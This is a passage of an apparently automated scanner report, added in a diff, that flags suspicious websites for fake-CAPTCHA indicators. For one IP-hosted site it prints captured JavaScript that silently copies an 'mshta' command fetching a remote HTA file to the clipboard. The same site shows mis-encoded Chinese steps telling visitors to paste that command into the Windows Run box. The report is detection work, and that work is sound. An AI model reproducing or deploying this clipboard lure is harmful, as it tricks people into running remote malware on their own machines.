+            <li><strong>Encoded:</strong> /bitrix/js/currency/currency...</li><li><strong>Decoded:</strong> <pre>,ܺޝ̿rzw2...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> YToyOntpOjA7czo5OiJDT0xPUl9SRUYiO2k6MTtzOjEzOiJTSV...</li><li><strong>Decoded:</strong> <pre>a:2:{i:0;s:9:"COLOR_REF";i:1;s:13:"SIZES_CLOTHES";}...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> YToyOntpOjA7czo5OiJDT0xPUl9SRUYiO2k6MTtzOjEzOiJTSV...</li><li><strong>Decoded:</strong> <pre>a:2:{i:0;s:9:"COLOR_REF";i:1;s:13:"SIZES_CLOTHES";}...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> YToyOntpOjA7czo5OiJDT0xPUl9SRUYiO2k6MTtzOjEzOiJTSV...</li><li><strong>Decoded:</strong> <pre>a:2:{i:0;s:9:"COLOR_REF";i:1;s:13:"SIZES_CLOTHES";}...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> YToyOntpOjA7czo5OiJDT0xPUl9SRUYiO2k6MTtzOjEzOiJTSV...</li><li><strong>Decoded:</strong> <pre>a:2:{i:0;s:9:"COLOR_REF";i:1;s:13:"SIZES_CLOTHES";}...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> YToyOntpOjA7czo5OiJDT0xPUl9SRUYiO2k6MTtzOjEzOiJTSV...</li><li><strong>Decoded:</strong> <pre>a:2:{i:0;s:9:"COLOR_REF";i:1;s:13:"SIZES_CLOTHES";}...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> YToyOntpOjA7czo5OiJDT0xPUl9SRUYiO2k6MTtzOjEzOiJTSV...</li><li><strong>Decoded:</strong> <pre>a:2:{i:0;s:9:"COLOR_REF";i:1;s:13:"SIZES_CLOTHES";}...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> ec5d0e2cff91ab20debac17d8febe5be...</li><li><strong>Decoded:</strong> <pre>y]}uius^{...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> YToyOntpOjA7czo5OiJDT0xPUl9SRUYiO2k6MTtzOjEzOiJTSV...</li><li><strong>Decoded:</strong> <pre>a:2:{i:0;s:9:"COLOR_REF";i:1;s:13:"SIZES_CLOTHES";}...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> YToyOntpOjA7czo5OiJDT0xPUl9SRUYiO2k6MTtzOjEzOiJTSV...</li><li><strong>Decoded:</strong> <pre>a:2:{i:0;s:9:"COLOR_REF";i:1;s:13:"SIZES_CLOTHES";}...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> YToyOntpOjA7czo5OiJDT0xPUl9SRUYiO2k6MTtzOjEzOiJTSV...</li><li><strong>Decoded:</strong> <pre>a:2:{i:0;s:9:"COLOR_REF";i:1;s:13:"SIZES_CLOTHES";}...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> YTo5Mzp7czoxNDoiSUJMT0NLX1RZUEVfSUQiO3M6NzoiY2F0YW...</li><li><strong>Decoded:</strong> <pre>a:93:{s:14:"IBLOCK_TYPE_ID";s:7:"catalog";s:9:"IBLOCK_ID";s:1:"2";s:10:"BASKET_URL";s:15:"/personal/cart/";s:18:"COMPONENT_TEMPLATE";s:0:"";s:11:"IBLOCK_TYPE";s:7:"catalog";s:10:"SECTION_ID";N;s:12:"S...</pre></li><li><strong>Contains PowerShell:</strong> No</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Suspicious Keywords (2)</p>
+                <ul>
+            <li>robot</li><li>hidden</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">URLs (12)</p>
+                <ul>
+            <li>https://marketplace.1c-bitrix.ru/?utm_source=demoshop&utm_medium=referral&utm_campaign=marketplace</li><li>https://www.facebook.com/1CBitrix</li><li>https://plus.google.com/111119180387208976312/</li><li>https://twitter.com/1c_bitrix</li><li>https://vk.com/bitrix_1c</li><li>https://instagram.com/1CBitrix/</li><li>https://twitter.com/1C_Bitrix</li><li>https://www.facebook.com/1CBitrix</li><li>https://plus.google.com/111119180387208976312/</li><li>https://twitter.com/1c_bitrix</li><li>https://vk.com/bitrix_1c</li><li>https://instagram.com/1CBitrix/</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Session Hijacking Attempts (1)</p>
+                <ul>
+            <li><pre>...{ var cookie = (function (name) { var parts = ("; " + document.cookie).split("; " + name + "="); if (parts.length == 2) { try {...</pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Proxy/Security Tool Evasion (13)</p>
+                <ul>
+            <li><pre>...e1b8e3524755c391129a9d7e6f2d206_pict_slider_indicator" > <span class="product-item-image-sli...</pre></li><li><pre>...rue,'SHOW_MAX_QUANTITY':'N','RELATIVE_QUANTITY_FACTOR':'5','SHOW_DISCOUNT_PERCENT':false,'ADD_TO_BASKET...</pre></li><li><pre>...62ce596257894d11ab5c1d73d13c755_pict_slider_indicator" > <span class="product-item-image-sli...</pre></li><li><pre>...80764dfaf26ca80162484593ec7c29b_pict_slider_indicator" > <span class="product-item-image-sli...</pre></li><li><pre>...0fb066f64e2309c4b241a491f76c62e_pict_slider_indicator" > <span class="product-item-image-sli...</pre></li><li><pre>...e8f6cea7f5e44ced2966cbefca3ecfa_pict_slider_indicator" > <span class="product-item-image-sli...</pre></li><li><pre>...f73996d13437b0b91038138616a89fe_pict_slider_indicator" > <span class="product-item-image-sli...</pre></li><li><pre>...c5d0e2cff91ab20debac17d8febe5be_pict_slider_indicator" > <span class="product-item-image-sli...</pre></li><li><pre>...7e5a53fd4b76e4dce4f311b34c340d4_pict_slider_indicator" > <span class="product-item-image-sli...</pre></li><li><pre>...acf0f176831c66031059fe22bcc4d9c_pict_slider_indicator" style="display: none;"> </span> </...</pre></li><li><pre>...return; } var btn_span = btn.querySelector("span"); var btn_subscribe_width = btn_span....</pre></li><li><pre>...f(btn_subscribe_width) { btn.querySelector("span").style["min-width"] = btn_subscribe_width+...</pre></li><li><pre>...y(function(){ var upButton = document.querySelector('[data-role="eshopUpButton"]'); BX.bind(upButto...</pre></li></ul></div></div>
+        <div class="site suspicious">
+            <h3 class="site-url">http://101.32.40.22/</h3>
+            <p>
+                <strong>Verdict:</strong> ⚠️ SUSPICIOUS
+                <span class="score-display score-high">Score: 178</span>
+            </p>
+            <p class="total-indicators"><strong>Total Indicators:</strong> 34</p>
+        
+            <div class="indicator">
+                <p class="indicator-title">Clipboard Manipulation (3)</p>
+                <ul>
+            <li><pre>...); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextA...</pre></li><li><pre>...ck", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "21px 0 0 12px"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" && verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "â ''I am not a robot - reCAPTCHA Verification ID: " const end = "''" const textToCopy = commandToRun + suffix + ploy + verification_id + end setClipboardCopyData(textToCopy); } function showVerifyWindow()...</pre></li><li><pre>...dy.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");...</pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Clipboard Commands (1)</p>
+                <ul>
+            <li><pre>mshta </pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">CAPTCHA Elements (4)</p>
+                <ul>
+            <li><pre><img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""></pre></li><li><pre>...="" id="spinner"> </div> <div id="verify-window" class="verify-window"> <div class="verify-container"> <header class="verify-header"> <span class="verify-header-text-medium m-p block">å®æè¿äº</span> <span class="verify-header-text-big m-p block">éªè¯æ­¥éª¤</span> <span class="verify-header-text-medium m-p block"></span> </header> <main class="verify-main"> <p> ä¸ºäºæ´å¥½çè¯ææ¨ä¸æ¯æºå¨äººï¼è¯·: </p> <ol> <li> æä½Windowsé® <i class="fab fa-windows"></i> + <b>R</b>ã </li> <li> å¨éªè¯çªå£ä¸­ï¼æ <b>Ctrl</b> + <b>V</b>ã </li> <li> æä¸é®çä¸ç <b>Enter</b> é®å®æã </li> </ol> <p> æ¨å°éµå®å¹¶åæ: <br> <code> â "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>" </code> </p> </main> </div> <footer class="verify-container verif...</pre></li><li><pre><div class="verify-footer-left"> æ§è¡ä¸è¿°æ­¥éª¤å³å¯å®æéªè¯ã </div></pre></li><li><pre><p class="im-not-a-robot m-p line-normal">I'm not a robot</p></pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Suspicious Keywords (18)</p>
+                <ul>
+            <li>CAPTCHA Verification</li><li>Verification ID</li><li>I am not a robot</li><li>CAPTCHA</li><li>captcha-iogo</li><li>captcha</li><li>CAPTCHA-iogo</li><li>CaptchaListeners</li><li>CaptchaCheckbox</li><li>CaptchaLoading</li><li>captcha-verify</li><li>Robot</li><li>robot</li><li>Verification</li><li>verification-id</li><li>verification_id</li><li>hidden</li><li>mshta</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">URLs (4)</p>
+                <ul>
+            <li>https://use.fontawesome.com/releases/v5.0.0/css/all.css</li><li>https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</li><li>https://www.google.com/intl/en/policies/privacy/</li><li>https://www.google.com/intl/en/policies/terms/</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Proxy/Security Tool Evasion (4)</p>
+                <ul>
+            <li><pre>...} function stageClipboard(commandToRun, verification_id){ const suffix = "...</pre></li><li><pre>...end = "''" const textToCopy = commandToRun + suffix + ploy + verification_id + end...</pre></li><li><pre>...n + "/recaptcha-verify"; const commandToRun = "mshta " + htaPath stageClipboard...</pre></li><li><pre>...hta " + htaPath stageClipboard(commandToRun, verification_id) } addCaptcha...</pre></li></ul></div></div>
+        <div class="site suspicious">
+            <h3 class="site-url">https://staplebrokenmetaliyro.blogspot.com/</h3>
+            <p>
+                <strong>Verdict:</strong> ⚠️ SUSPICIOUS
+                <span class="score-display score-high">Score: 149</span>
+            </p>
+            <p class="total-indicators"><strong>Total Indicators:</strong> 57</p>
+        
+            <div class="indicator">
+                <p class="indicator-title">Base64 Strings (9)</p>
+                <ul>
+            <li><strong>Encoded:</strong> com/profile/02686294779557843862...</li><li><strong>Decoded:</strong> <pre>rWnoxy8ζ...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> com/s/roboto/v48/KFOMCnqEu92Fr1ME7kSn66aGLdTylUAMQ...</li><li><strong>Decoded:</strong> <pre>rnh<N0)vLSU 1&`5kfR 8...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> com/profile/02686294779557843862...</li><li><strong>Decoded:</strong> <pre>rWnoxy8ζ...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> com/profile/02686294779557843862...</li><li><strong>Decoded:</strong> <pre>rWnoxy8ζ...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> com/profile/02686294779557843862...</li><li><strong>Decoded:</strong> <pre>rWnoxy8ζ...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> x22staplebrokenmetal...</li><li><strong>Decoded:</strong> <pre>meyz֥...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> x22staplebrokenmetal...</li><li><strong>Decoded:</strong> <pre>meyz֥...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> x22staplebrokenmetal...</li><li><strong>Decoded:</strong> <pre>meyz֥...</pre></li><li><strong>Contains PowerShell:</strong> No</li><li><strong>Encoded:</strong> com/profile/02686294779557843862...</li><li><strong>Decoded:</strong> <pre>rWnoxy8ζ...</pre></li><li><strong>Contains PowerShell:</strong> No</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Clipboard Manipulation (1)</p>
+                <ul>
+            <li><pre>...ync' src='https://www.gstatic.com/external_hosted/clipboardjs/clipboard.min.js'></script> <meta name='google-ad...</pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Suspicious Keywords (3)</p>
+                <ul>
+            <li>Robot</li><li>robot</li><li>hidden</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">URLs (40)</p>
+                <ul>
+            <li>http://www.google.com/2005/gml/b</li><li>http://www.google.com/2005/gml/data</li><li>http://www.google.com/2005/gml/expr</li><li>https://electricreport.org/ygd4g</li><li>https://staplebrokenmetaliyro.blogspot.com/favicon.ico</li><li>https://staplebrokenmetaliyro.blogspot.com/</li><li>https://staplebrokenmetaliyro.blogspot.com/feeds/posts/default</li><li>https://staplebrokenmetaliyro.blogspot.com/feeds/posts/default?alt=rss</li><li>https://www.blogger.com/feeds/3967763303726818370/posts/default</li><li>https://www.blogger.com/profile/02686294779557843862</li><li>https://staplebrokenmetaliyro.blogspot.com/</li><li>https://www.blogblog.com/indie/mspin_black_large.svg</li><li>https://www.blogblog.com/indie/mspin_white_large.svg</li><li>https://themes.googleusercontent.com/image?id=L1lcAxxz0CLgsDzixEprHJ2F38TyEjCyE3RSAjynQDks0lT1BDc1OxXKaTEdLc89HPvdB11X9FDw</li><li>http://www.offset.com/photos/394244</li><li>https://www.gstatic.com/external_hosted/clipboardjs/clipboard.min.js</li><li>https://staplebrokenmetaliyro.blogspot.com/search</li><li>https://www.blogger.com</li><li>http://www.offset.com/photos/394244</li><li>https://www.blogger.com/profile/02686294779557843862</li><li>https://www.blogger.com/profile/02686294779557843862</li><li>https://www.blogger.com/profile/02686294779557843862</li><li>https://www.blogger.com/go/report-abuse</li><li>https://resources.blogblog.com/blogblog/data/res/1431921148-indie_compiled.js</li><li>https://www.blogger.com/static/v1/widgets/2422103421-widgets.js</li><li>https://staplebrokenmetaliyro.blogspot.com/</li><li>https://staplebrokenmetaliyro.blogspot.com/</li><li>https://staplebrokenmetaliyro.blogspot.com/</li><li>https://staplebrokenmetaliyro.blogspot.com/search</li><li>https://staplebrokenmetaliyro.blogspot.com/</li><li>https://staplebrokenmetaliyro.blogspot.com/favicon.ico</li><li>https://www.blogger.com</li><li>https://staplebrokenmetaliyro.blogspot.com/feeds/posts/default\x22</li><li>https://staplebrokenmetaliyro.blogspot.com/feeds/posts/default?alt\x3drss\x22</li><li>https://www.blogger.com/feeds/3967763303726818370/posts/default\x22</li><li>https://www.blogger.com/profile/02686294779557843862\x22</li><li>https://apis.google.com/js/platform.js</li><li>https://staplebrokenmetaliyro.blogspot.com/</li><li>https://www.blogger.com/static/v1/jsbin/497930099-lbx.js</li><li>https://www.blogger.com/static/v1/v-css/123180807-lightbox_bundle.css</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Proxy/Security Tool Evasion (4)</p>
+                <ul>
+            <li><pre>...tton-color'/> <meta content='blogger' name='generator'/> <link href='https://staplebrokenmetaliyro.blog...</pre></li><li><pre>...margin:0 auto } body.item-view .post-body>.separator:first-child>a[imageanchor="1"]:first-child{ margi...</pre></li><li><pre>..."0"] p.comment-footer{ display:none } #comment-editor-src{ display:none } .comments .comments-content ....</pre></li><li><pre>...ment-holder .continue{ display:none } #comment-editor{ margin-bottom:20px; margin-top:20px } #comments...</pre></li></ul></div></div>
+    </body>
+    </html>
+    
